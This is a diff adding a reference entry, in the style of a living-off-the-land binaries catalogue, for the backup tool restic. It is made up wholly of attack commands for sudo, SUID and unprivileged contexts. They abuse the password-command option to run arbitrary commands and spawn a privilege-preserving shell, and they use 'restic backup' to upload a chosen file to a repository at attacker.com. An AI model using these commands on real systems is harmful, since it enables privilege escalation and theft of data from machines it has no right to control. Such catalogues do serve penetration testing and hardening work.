@@ -1,0 +1,56 @@
+restic
+======
+
+Command
+-------
+
+[Sudo]
+    RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
+
+[SUID]
+    RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
+
+[Unprivileged]
+    RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
+
+[Sudo]
+    restic --password-command='/path/to/command' backup
+
+[SUID]
+    restic --password-command='/path/to/command' backup
+
+[Unprivileged]
+    restic --password-command='/path/to/command' backup
+
+Shell
+-----
+
+[Sudo]
+    RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
+
+[SUID]
+    RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
+
+[Unprivileged]
+    RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
+
+[Sudo]
+    restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
+
+[SUID]
+    restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
+
+[Unprivileged]
+    restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
+
+Upload
+------
+
+[Sudo]
+    restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
+
+[SUID]
+    restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
+
+[Unprivileged]
+    restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
